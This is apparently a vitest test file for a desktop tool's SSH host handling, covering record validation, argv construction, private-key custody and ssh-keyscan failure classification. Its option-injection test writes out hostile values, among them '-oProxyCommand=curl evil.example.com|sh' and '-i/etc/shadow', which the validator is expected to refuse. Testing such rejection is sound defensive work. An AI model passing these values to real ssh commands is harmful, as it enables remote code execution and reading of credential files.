/**
 * A host record, the command it becomes, and the key DASH holds for it
 * (MAR-484, ADR 0007).
 *
 * Three things are being checked and only the first is ordinary validation.
 *
 * **Option injection.** `ssh` takes its options as argv, and argv has no
 * quoting layer to get wrong — an address of `-oProxyCommand=…` is not an
 * address, it is a flag, and `ssh` reads it as one however careful the
 * surrounding code was. This is the deploy plane's version of
 * `runner/README.md`'s standing sentence: DASH chooses which host and which
 * verb, never which options. It is a boundary against **DASH itself** rather
 * than against the host — DASH holds a key that could run anything there — and
 * what it rules out is a bad record turning a poll into arbitrary remote
 * execution.
 *
 * **What is absent from the command.** No `-L`, no `-R`, no `-D`. ADR 0007
 * rejected a forwarded loopback port for MAR-430's own reason: the near end of
 * a forwarded port is a TCP listener on *this* machine with a bearer token in
 * front of it, which is exactly what MAR-430 deleted. The way that stays true
 * is that the flag is never passed, so the assertion is on the absence.
 *
 * **What custody means, as an absence too.** `electron/ssh-host.ts` can create
 * a key, protect it, prove it is protected, and name its path — and has no
 * function that returns one. DASH cannot leak what it never reads, and that is
 * asserted over the module's own exports rather than left as a claim in a
 * header.
 */

import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";

import {
  checkHostRecord,
  describeHostReach,
  HOST_VERBS,
  sshArgv,
  type HostRecord,
} from "../lib/hosts";
import * as sshHost from "../electron/ssh-host";
import { HOST_REACH_PROBLEMS } from "../lib/host-connect";
import { expectPlainLanguage } from "./helpers/plain-language";

/** A real `ssh-ed25519` blob: the algorithm name, length-prefixed, then 32 bytes. */
const ED25519_BLOB = "AAAAC3NzaC1lZDI1NTE5AAAAIEzfw+6qmw2XISBRAMGf2Gt1/sClsgY5tduInO/HiZtR";

/**
 * Generous, and for a stated reason rather than as padding.
 *
 * These tests spawn real external processes: `ssh-keygen`, and on Windows a
 * `whoami` plus up to three `icacls` invocations per hardened path. Alone they
 * take well under a second; under full-suite load on Windows they exceeded
 * vitest's 5s default and the run went red on a timeout rather than on a
 * defect. That is MAR-472's lesson — `settle(400)` betting a fixed sleep on
 * Windows spawning a Node process — and the answer is the same: the assertion
 * is unchanged, only the budget is honest about what the work is.
 */
const SHELLING_OUT_MS = 60_000;

const scratch: string[] = [];
function workDir(): string {
  const directory = mkdtempSync(path.join(tmpdir(), "dash-host-"));
  scratch.push(directory);
  return directory;
}
afterAll(() => {
  for (const directory of scratch) {
    rmSync(directory, { recursive: true, force: true });
  }
});

function record(overrides: Partial<HostRecord> = {}): HostRecord {
  return {
    host_id: "host-01",
    label: "My server",
    address: "vps.example.com",
    port: 22,
    username: "dash",
    key_name: "host-01",
    host_fingerprint: null,
    added_at: "2026-08-06T18:00:00.000Z",
    ...overrides,
  };
}

/* ---------------------------------------------------------------------- *
 * The record
 * ---------------------------------------------------------------------- */

describe("checkHostRecord", () => {
  it("accepts an ordinary host", () => {
    expect(checkHostRecord(record()).ok).toBe(true);
  });

  it("accepts an IP address and a bracketed IPv6 literal", () => {
    expect(checkHostRecord(record({ address: "203.0.113.4" })).ok).toBe(true);
    expect(checkHostRecord(record({ address: "[2001:db8::1]" })).ok).toBe(true);
  });

  /**
   * The one refusal with a security story behind it rather than a typo, which
   * is why it has its own problem code and is checked before the patterns: a
   * person told "that is not a valid address" would go looking for a typo.
   */
  it.each([
    ["address", { address: "-oProxyCommand=curl evil.example.com|sh" }],
    ["username", { username: "-oPermitLocalCommand=yes" }],
    ["key name", { key_name: "-i/etc/shadow" }],
  ])("refuses a %s that ssh would read as an option", (_field, overrides) => {
    const checked = checkHostRecord(record(overrides));
    expect(checked.ok).toBe(false);
    if (!checked.ok) {
      expect(checked.problem).toBe("option_injection");
    }
  });

  it.each([
    ["a scheme", "ssh://vps.example.com"],
    ["a user in front", "dash@vps.example.com"],
    ["a port on the end", "vps.example.com:22"],
    ["a path", "vps.example.com/agents"],
    ["a space", "vps example com"],
    ["nothing", ""],
  ])("refuses an address carrying %s", (_why, address) => {
    const checked = checkHostRecord(record({ address }));
    expect(checked.ok).toBe(false);
    if (!checked.ok) {
      expect(checked.problem).toBe("malformed_address");
    }
  });

  it("refuses a port that is not one", () => {
    for (const port of [0, 65_536, 22.5, Number.NaN]) {
      const checked = checkHostRecord(record({ port }));
      expect(checked.ok).toBe(false);
      if (!checked.ok) {
        expect(checked.problem).toBe("malformed_port");
      }
    }
  });

  it("refuses an account name the host would not have", () => {
    for (const username of ["Root", "a b", "", "x".repeat(40)]) {
      expect(checkHostRecord(record({ username })).ok).toBe(false);
    }
  });

  it("refuses a nameless host, because a person has to recognise it later", () => {
    const checked = checkHostRecord(record({ label: "   " }));
    expect(checked.ok).toBe(false);
    if (!checked.ok) {
      expect(checked.problem).toBe("malformed_label");
    }
  });

  it("holds no key material, no passphrase and no channel secret", () => {
    // The shape is the assertion: a record is written to disk and rendered, so
    // a field that could hold a credential is a field that eventually will.
    expect(Object.keys(record()).sort()).toEqual([
      "added_at",
      "address",
      "host_fingerprint",
      "host_id",
      "key_name",
      "label",
      "port",
      "username",
    ]);
  });
});

/* ---------------------------------------------------------------------- *
 * The command
 * ---------------------------------------------------------------------- */

describe("sshArgv", () => {
  const paths = { identity_file: "/data/hosts/host-01.key", known_hosts_file: "/data/hosts/known_hosts" };
  const argv = sshArgv(record(), "connect", paths);

  it("names the host and the verb, and nothing after the verb", () => {
    expect(argv[argv.length - 2]).toBe("dash@vps.example.com");
    expect(argv[argv.length - 1]).toBe("connect");
  });

  it("hands ssh the bare address for an IPv6 host, which is stored bracketed", () => {
    const v6 = sshArgv(record({ address: "[2001:db8::1]" }), "connect", paths);
    expect(v6).toContain("dash@2001:db8::1");
  });

  it("never prompts, because a prompt with no terminal is a hang", () => {
    expect(argv).toContain("BatchMode=yes");
  });

  /**
   * `accept-new` would silently trust a new key the first time an address
   * changed, which is the case pinning exists for. And the file is DASH's own:
   * `~/.ssh/known_hosts` belongs to the person, DASH must not edit it, and DASH
   * cannot vouch for what is already in it.
   */
  it("pins the host key strictly, in a file DASH owns rather than the user's", () => {
    expect(argv).toContain("StrictHostKeyChecking=yes");
    expect(argv).toContain(`UserKnownHostsFile=${paths.known_hosts_file}`);
    expect(argv.join(" ")).not.toContain("accept-new");
  });

  it("offers only this host's key, and consults no agent", () => {
    expect(argv).toContain("IdentitiesOnly=yes");
    expect(argv).toContain("IdentityAgent=none");
    expect(argv).toContain("-i");
    expect(argv).toContain(paths.identity_file);
  });

  /**
   * ADR 0007's rejection of option 2, enforced by absence. A forwarded port's
   * near end is a TCP listener on this machine — the exact thing MAR-430
   * deleted — so the way it stays rejected is that the flag is never passed.
   */
  it("forwards nothing, in either direction", () => {
    for (const flag of ["-L", "-R", "-D", "-W", "-w"]) {
      expect(argv).not.toContain(flag);
    }
  });

  it("composes no command line: every verb comes from the closed set", () => {
    /*
     * Pinned by value, and this pin has **fired four times**: once when MAR-487
     * widened the set from `["connect"]` to ADR 0007's six, again when MAR-602
     * added `channel`, again when MAR-611 added `uninstall`, and again when
     * MAR-629 added `pack`. Every time it did its job. The set being closed is
     * only worth anything if adding to it is a change somebody has to make here
     * and defend, rather than one that rides along in a commit about something
     * else.
     *
     * What this file asserts about the last three is narrower than the argument
     * for admitting them, and it is the part that belongs here: whatever a verb
     * carries, **the verb is still the last thing on the command line**.
     * `channel`'s answer holds a credential, `uninstall` removes a directory,
     * `pack` reads the identity of the tree the host's secret store lives in —
     * and none of them puts anything on argv, because `pack` carries no
     * identifier at all and the other two take one that travels on stdin like
     * every other. `lib/deploy/verbs.ts` and `tests/deploy-bridge.test.ts` carry
     * the admission arguments.
     */
    expect([...HOST_VERBS]).toEqual([
      "install",
      "start",
      "stop",
      "status",
      "collect",
      "connect",
      "channel",
      "uninstall",
      "pack",
    ]);
    for (const verb of HOST_VERBS) {
      const built = sshArgv(record(), verb, paths);
      expect(built[built.length - 1]).toBe(verb);
    }
  });

  it("appends nothing a request chose, except the one identifier connect needs", () => {
    /*
     * MAR-487's argv rule. Every verb's arguments travel as JSON on the child's
     * stdin, so the command line carries fixed options, a destination and a
     * verb — full stop. `connect` cannot use stdin, because its stdin *is* the
     * HTTP conversation, so its bundle id rides here over an alphabet that
     * cannot spell a separator, a traversal or a leading "-".
     */
    const withoutId = sshArgv(record(), "install", paths);
    expect(withoutId[withoutId.length - 1]).toBe("install");

    const withId = sshArgv(record(), "connect", paths, "news-scout");
    expect(withId.slice(-2)).toEqual(["connect", "news-scout"]);
    expect(withId).toHaveLength(withoutId.length + 1);
  });
});

/* ---------------------------------------------------------------------- *
 * What the Connection Center says
 * ---------------------------------------------------------------------- */

describe("describeHostReach", () => {
  const reach = describeHostReach();

  it("says both halves, including the one nobody enjoys", () => {
    expect(reach.while_open).toContain("Nothing on the server can reach back");
    // The second sentence is the honest one and it is unpleasant. ADR 0007
    // requires it *before* the first deploy, so a renderer that found it
    // discouraging cannot quietly drop it.
    expect(reach.while_closed).toContain("keep running when DASH is closed");
    expect(reach.while_closed).toContain("will not see what they did until you open it again");
  });

  it("is plain language: no field names, no environment names, no filenames", () => {
    expectPlainLanguage([reach.while_open, reach.while_closed]);
  });
});

/* ---------------------------------------------------------------------- *
 * Custody
 * ---------------------------------------------------------------------- */

describe("the key DASH holds", () => {
  /**
   * The strongest claim this module makes is an absence, so it is asserted over
   * the exports rather than trusted to a header. A future `readHostKey`,
   * `exportHostKey` or `hostKeyMaterial` fails here — which is where somebody
   * would add one, because the deploy plane will one day want to "just check"
   * the key.
   *
   * MAR-572 added the first reader that is allowed: `readHostPublicKey`, which
   * enrollment needs because it must be resumable — before it, the only way to
   * see the public half was to *mint a key*, so a flow that lost its place
   * minted another one and stranded the first.
   *
   * The exemption is by exact name and it is deliberately narrow. `Public` in a
   * name is a claim, and a claim is not evidence, so the test below no longer
   * stops at the name: it runs every exempted reader against a real key pair
   * and asserts that what comes back is the public half and carries nothing of
   * the other one. That is a stronger guard than the one it replaces, which
   * checked no behaviour at all.
   */
  const PUBLIC_READERS = ["readHostPublicKey"] as const;

  it("has no function that returns a private key", () => {
    const readers = Object.keys(sshHost).filter(
      (name) => /^(read|export|get|load|reveal)/i.test(name) && /key/i.test(name),
    );
    expect(readers).toEqual([...PUBLIC_READERS]);
  });

  const tools = sshHost.probeSshTools();
  const whenSsh = tools.present ? it : it.skip;

  whenSsh(
    "hands back only the public half from the one reader that is allowed",
    () => {
      const dataDir = workDir();
      const minted = sshHost.createHostKey(dataDir, "host-01");
      const readBack = sshHost.readHostPublicKey(dataDir, "host-01");

      // The same string minting returned, so there is no second, looser route
      // to the same file.
      expect(readBack).toBe(minted);
      expect(readBack.startsWith("ssh-ed25519 ")).toBe(true);
      expect(readBack).not.toContain("PRIVATE KEY");

      // And the private half really is sitting next to it, unread.
      const onDisk = readFileSync(sshHost.hostKeyPath(dataDir, "host-01"), "utf8");
      expect(onDisk).toContain("PRIVATE KEY");
      expect(readBack).not.toContain(onDisk.trim());
    },
    SHELLING_OUT_MS,
  );

  it("refuses to read a public half for a host whose key is gone", () => {
    // Enrollment resumes by asking for what exists. When the record outlived
    // its key there is nothing honest to return, and main turns this into
    // "start this server over" rather than minting a key the server's
    // allowed-keys file has never been told about.
    const dataDir = workDir();
    sshHost.hostKeysDirectory(dataDir);
    expect(() => sshHost.readHostPublicKey(dataDir, "absent")).toThrowError(
      /no longer holds the key/,
    );
  });

  it("names the key by path without the record ever carrying one", () => {
    const dataDir = workDir();
    expect(sshHost.hostKeyPath(dataDir, "host-01")).toBe(
      path.join(dataDir, "hosts", "host-01.key"),
    );
    expect(Object.keys(record())).not.toContain("key_path");
  });

  it("refuses to use a key that is not there, rather than failing inside ssh", () => {
    const dataDir = workDir();
    sshHost.hostKeysDirectory(dataDir);
    expect(() => sshHost.assertHostKeyProtected(dataDir, "absent")).toThrowError(
      /no longer holds the key/,
    );
  }, SHELLING_OUT_MS);

  it("proves the directory it puts keys in is owner-only", () => {
    const dataDir = workDir();
    // `hardenOwnerOnly` throws rather than returning false, so reaching the
    // next line is the assertion — the same shape `ensureChannelSecret` has.
    expect(() => sshHost.hostKeysDirectory(dataDir)).not.toThrow();
  }, SHELLING_OUT_MS);

  /**
   * The probe ADR 0007 requires: "the connect flow probes for it and says so
   * plainly rather than failing at the first deploy". Whether `ssh` is present
   * is a fact about the machine running this test, so both answers are
   * asserted for shape rather than for value.
   */
  it("says whether this machine has ssh, and in plain language when it does not", () => {
    const tools = sshHost.probeSshTools();
    expect(typeof tools.present).toBe("boolean");
    if (tools.present) {
      expect(tools.detail).toBeNull();
    } else {
      expect(tools.detail).not.toBeNull();
      expectPlainLanguage([tools.detail ?? ""]);
    }
  }, SHELLING_OUT_MS);

  it("will not overwrite a key a host was already told to trust", () => {
    const dataDir = workDir();
    sshHost.hostKeysDirectory(dataDir);
    writeFileSync(sshHost.hostKeyPath(dataDir, "host-01"), "not really a key\n", "utf8");
    expect(() => sshHost.createHostKey(dataDir, "host-01")).toThrowError(/already holds a key/);
  }, SHELLING_OUT_MS);
});

describe("minting a key with the machine's own ssh-keygen", () => {
  const tools = sshHost.probeSshTools();
  const when = tools.present ? it : it.skip;

  when("creates a protected pair and hands back only the public half", () => {
    const dataDir = workDir();
    const publicKey = sshHost.createHostKey(dataDir, "host-01");

    // What travels: the line a person pastes into the host's authorized_keys.
    expect(publicKey.startsWith("ssh-ed25519 ")).toBe(true);
    expect(publicKey).not.toContain("PRIVATE KEY");

    // What does not: the private half is on this machine and nothing returned it.
    const onDisk = readFileSync(sshHost.hostKeyPath(dataDir, "host-01"), "utf8");
    expect(onDisk).toContain("PRIVATE KEY");
    expect(publicKey).not.toContain(onDisk.trim());

    // And it is proven protected on the way to being used, not once at creation.
    expect(sshHost.assertHostKeyProtected(dataDir, "host-01")).toBe(
      sshHost.hostKeyPath(dataDir, "host-01"),
    );
  }, SHELLING_OUT_MS);

  when("creates the known-hosts file it will later be strict against", () => {
    const dataDir = workDir();
    sshHost.createHostKey(dataDir, "host-02");
    expect(readFileSync(sshHost.knownHostsPath(dataDir), "utf8")).toBe("");
  }, SHELLING_OUT_MS);
});

/* ---------------------------------------------------------------------- *
 * Which OpenSSH DASH drives (MAR-600)
 * ---------------------------------------------------------------------- */

/**
 * The wall a stock Windows 11 hit on 2026-08-10, and the two halves of the fix.
 *
 * DASH invoked `ssh`, `ssh-keyscan` and `ssh-keygen` as bare names through the
 * system search path. On a machine with nothing installed that is Microsoft's
 * bundled OpenSSH 9.5p2, whose `ssh-keyscan` cannot complete a key exchange
 * with the OpenSSH 9.6p1 on Ubuntu 24.04 that this project's own runbook tells
 * a person to rent — while its `ssh` reaches the same host perfectly well. So
 * the search is asserted here and the reading of a failed scan below, because
 * neither is reproducible on the machine CI runs on.
 */
describe("finding the three binaries rather than trusting the path", () => {
  const WINDOWS = "C:\\WINDOWS";
  const GIT = "C:\\Program Files\\Git\\usr\\bin";
  const env = {
    SystemRoot: WINDOWS,
    ProgramFiles: "C:\\Program Files",
  } as unknown as NodeJS.ProcessEnv;

  /** A machine where both OpenSSHes are installed, which is the interesting one. */
  function bothInstalled(file: string): boolean {
    return file.startsWith(`${WINDOWS}\\System32\\OpenSSH\\`) || file.startsWith(`${GIT}\\`);
  }

  function chosen(name: sshHost.SshToolName): string {
    return sshHost.resolveSshTool(name, { env, platform: "win32", exists: bothInstalled }).command;
  }

  it("reads a server's identity with the newer OpenSSH when there is one", () => {
    // The binary that failed, and the only one of the three whose command line
    // carries no file path for a different build to mis-translate.
    expect(chosen("ssh-keyscan")).toBe(`${GIT}\\ssh-keyscan.exe`);
  });

  it("still connects and mints keys with the one Windows ships", () => {
    /*
     * Deliberately not the same preference. These two are handed this machine's
     * own file paths — the identity file, the known-hosts file — and the native
     * build is the one that has been reading them correctly on every installed
     * DASH so far. The run confirmed the stock `ssh` completes a full handshake
     * with the host that defeated the stock `ssh-keyscan`, so there is nothing
     * to buy by changing it and a working path to risk.
     */
    expect(chosen("ssh")).toBe(`${WINDOWS}\\System32\\OpenSSH\\ssh.exe`);
    expect(chosen("ssh-keygen")).toBe(`${WINDOWS}\\System32\\OpenSSH\\ssh-keygen.exe`);
  });

  it("names where each one came from, which is what nothing could say before", () => {
    const search = { env, platform: "win32" as const, exists: bothInstalled };
    expect(sshHost.resolveSshTool("ssh-keyscan", search).source).toBe("Git for Windows");
    expect(sshHost.resolveSshTool("ssh", search).source).toBe("Windows' own OpenSSH");
  });

  it("falls back to the bare name when it recognises nowhere", () => {
    // A machine with an OpenSSH somewhere this list has never heard of must keep
    // working exactly as it did before any of this.
    for (const name of sshHost.SSH_TOOL_NAMES) {
      const tool = sshHost.resolveSshTool(name, { env, platform: "win32", exists: () => false });
      expect(tool.command).toBe(name);
      expect(tool.source).toBe("the system search path");
    }
  });

  it("lets somebody who knows which one works say so", () => {
    // MAR-600's complaint was not only that the path was trusted; it was that a
    // person who had already found the working binary had no way to name it.
    const told = { ...env, DASH_OPENSSH_DIR: "D:\\openssh\\bin" } as unknown as NodeJS.ProcessEnv;
    expect(
      sshHost.resolveSshTool("ssh-keyscan", { env: told, platform: "win32", exists: () => true })
        .command,
    ).toBe("D:\\openssh\\bin\\ssh-keyscan.exe");
  });

  it("keeps every candidate, so a scan can try the next one", () => {
    const candidates = sshHost.sshToolCandidates("ssh-keyscan", {
      env,
      platform: "win32",
      exists: bothInstalled,
    });
    expect(candidates.map((one) => one.command)).toEqual([
      `${GIT}\\ssh-keyscan.exe`,
      `${WINDOWS}\\System32\\OpenSSH\\ssh-keyscan.exe`,
      "ssh-keyscan",
    ]);
  });

  it("names one directory once, however many variables point at it", () => {
    // `ProgramFiles` and `ProgramW6432` are the same folder in a 64-bit process,
    // and a list holding it twice would run the same broken binary twice.
    const duplicated = {
      ...env,
      ProgramW6432: "C:\\Program Files",
    } as unknown as NodeJS.ProcessEnv;
    const commands = sshHost
      .sshToolCandidates("ssh-keyscan", {
        env: duplicated,
        platform: "win32",
        exists: bothInstalled,
      })
      .map((one) => one.command);
    expect(new Set(commands).size).toBe(commands.length);
  });

  it("probes the tool that fails, not only the one that works", () => {
    // `probeSshTools` used to run `ssh -V` and stop. That proved a tool was
    // present, never that it worked, and it probed the wrong binary — so DASH's
    // own preflight passed and the failure surfaced two steps later wearing a
    // sentence about the user's server.
    const probed = sshHost.probeSshTools();
    expect(Object.keys(probed.chosen).sort()).toEqual([...sshHost.SSH_TOOL_NAMES].sort());
    for (const name of sshHost.SSH_TOOL_NAMES) {
      expect(probed.chosen[name].command.length).toBeGreaterThan(0);
      expect(probed.chosen[name].source.length).toBeGreaterThan(0);
    }
  }, SHELLING_OUT_MS);
});

/* ---------------------------------------------------------------------- *
 * What a scan that found nothing actually means (MAR-600)
 * ---------------------------------------------------------------------- */

/**
 * The regression, written from the run's own capture.
 *
 * These are the two lines a stock Windows 11 produced against the rented Ubuntu
 * box, and DASH read them as "nothing answered" — then told the user that the
 * address or the port might be wrong, that the server might still be starting,
 * or that its firewall might be blocking them. All three were false, TCP 22 was
 * open and answering throughout, and the fault was on the reader's own PC.
 *
 * The first line is what makes the reclassification a deduction rather than a
 * guess: a server that is not answering cannot send its own protocol banner.
 */
const STOCK_WINDOWS_KEYSCAN = {
  stdout: "",
  stderr:
    "# 186.240.156.166:22 SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18\n" +
    "choose_kex: unsupported KEX method sntrup761x25519-sha512@openssh.com\n",
};

describe("reading what ssh-keyscan came back with", () => {
  it("calls a banner with no key a problem on this computer, never a silent server", () => {
    const read = sshHost.classifyKeyscanAttempt(STOCK_WINDOWS_KEYSCAN);
    expect(read).toEqual({ ok: false, problem: "tool_cannot_scan" });
  });

  it("classifies it from the banner alone, whichever stream carried it", () => {
    // Builds disagree about whether the `#` comment is stdout or stderr, and
    // which one it is has never been the interesting question.
    expect(
      sshHost.classifyKeyscanAttempt({
        stdout: "# 203.0.113.7:22 SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18\n",
        stderr: "",
      }),
    ).toEqual({ ok: false, problem: "tool_cannot_scan" });
  });

  it("classifies it from the negotiation failure alone, when no banner arrived", () => {
    expect(
      sshHost.classifyKeyscanAttempt({
        stdout: "",
        stderr:
          "Unable to negotiate with 203.0.113.7 port 22: no matching key exchange method found\n",
      }),
    ).toEqual({ ok: false, problem: "tool_cannot_scan" });
  });

  it("still says nothing answered when nothing did", () => {
    // The honest other half. A silent address must not start wearing the new
    // sentence, or the fix would have swapped one wrong explanation for another.
    expect(sshHost.classifyKeyscanAttempt({ stdout: "", stderr: "" })).toEqual({
      ok: false,
      problem: "no_answer",
    });
    expect(
      sshHost.classifyKeyscanAttempt({
        stdout: "",
        stderr: "getaddrinfo no-such-host.example: Name or service not known\n",
      }),
    ).toEqual({ ok: false, problem: "no_answer" });
  });

  it("reads a real key out of a real scan", () => {
    const read = sshHost.classifyKeyscanAttempt({
      stdout: `vps.example.com ssh-ed25519 ${ED25519_BLOB}\n`,
      stderr: "# vps.example.com:22 SSH-2.0-OpenSSH_9.6p1\n",
    });
    expect(read.ok).toBe(true);
    expect(read.ok ? read.offer.chosen.type : null).toBe("ssh-ed25519");
  });
});

describe("scanning with more than one ssh-keyscan on the machine", () => {
  const banner = { ...STOCK_WINDOWS_KEYSCAN, absent: false };
  const key = { stdout: `vps.example.com ssh-ed25519 ${ED25519_BLOB}\n`, stderr: "", absent: false };

  /**
   * Henrik's machine, described rather than depended on.
   *
   * The fall-through only exists when there is somewhere to fall to, and CI runs
   * on a Linux box with exactly one `ssh-keyscan` — so the layout is injected.
   * Asserting this against whatever the test machine happens to have installed
   * would make the interesting case skip itself on the only machine that runs it
   * every time.
   */
  const bothInstalled = {
    env: {
      SystemRoot: "C:\\WINDOWS",
      ProgramFiles: "C:\\Program Files",
    } as unknown as NodeJS.ProcessEnv,
    platform: "win32" as const,
    exists: () => true,
  };

  it("moves on to the next one when the preferred one cannot finish", () => {
    const tried: string[] = [];
    const result = sshHost.scanHostKey(
      record(),
      (tool) => {
        tried.push(tool.command);
        return tried.length === 1 ? banner : key;
      },
      bothInstalled,
    );

    expect(result.ok).toBe(true);
    expect(result.ok ? result.offer.chosen.type : null).toBe("ssh-ed25519");
    // It really did fall through rather than getting lucky on the first one.
    expect(tried.length).toBeGreaterThan(1);
    expect(tried[0]).toBe("C:\\Program Files\\Git\\usr\\bin\\ssh-keyscan.exe");
  });

  it("says it is this computer's problem when none of them can finish", () => {
    expect(sshHost.scanHostKey(record(), () => banner, bothInstalled)).toEqual({
      ok: false,
      problem: "tool_cannot_scan",
    });
  });

  it("never lets a quieter second binary undo what the first one proved", () => {
    /*
     * The downgrade MAR-600 is about, reachable one layer in. The first
     * candidate saw the server's own protocol banner, so "nothing answered" is
     * a thing DASH now knows to be false — and a second binary that fails
     * without saying as much must not be able to send a person back to checking
     * an address that was correct all along.
     */
    let attempts = 0;
    const result = sshHost.scanHostKey(
      record(),
      () => {
        attempts += 1;
        return attempts === 1 ? banner : { stdout: "", stderr: "", absent: false };
      },
      bothInstalled,
    );
    expect(result).toEqual({ ok: false, problem: "tool_cannot_scan" });
    expect(attempts).toBeGreaterThan(1);
  });

  it("stops at the first silence rather than making somebody wait twice", () => {
    /*
     * A mistyped address is the commonest way into this branch, and a second
     * bounded attempt would double the wait for it. A different binary cannot
     * make a silent address speak, so there is nothing to buy by asking one.
     */
    let attempts = 0;
    const result = sshHost.scanHostKey(
      record(),
      () => {
        attempts += 1;
        return { stdout: "", stderr: "", absent: false };
      },
      bothInstalled,
    );
    expect(result).toEqual({ ok: false, problem: "no_answer" });
    expect(attempts).toBe(1);
  });

  it("says the tool is missing only when every candidate really is", () => {
    expect(
      sshHost.scanHostKey(record(), () => ({ stdout: "", stderr: "", absent: true }), bothInstalled),
    ).toEqual({ ok: false, problem: "no_ssh" });
  });
});

describe("the sentence a failed scan becomes", () => {
  it("sends a tool problem to this computer and never to the server's address", () => {
    const refusal = sshHost.hostScanRefusal("tool_cannot_scan");
    expect(refusal.problem).toBe("ssh_tools_cannot_check_here");
  });

  it("has an answer for every problem a scan can report", () => {
    // One mapping beside the union, rather than the two ternary chains in `main`
    // that a new member would have fallen quietly through.
    for (const problem of ["no_ssh", "no_answer", "no_supported_key", "tool_cannot_scan"] as const) {
      const refusal = sshHost.hostScanRefusal(problem);
      expect(HOST_REACH_PROBLEMS).toContain(refusal.problem);
      expect(refusal.detail.length).toBeGreaterThan(0);
    }
  });
});
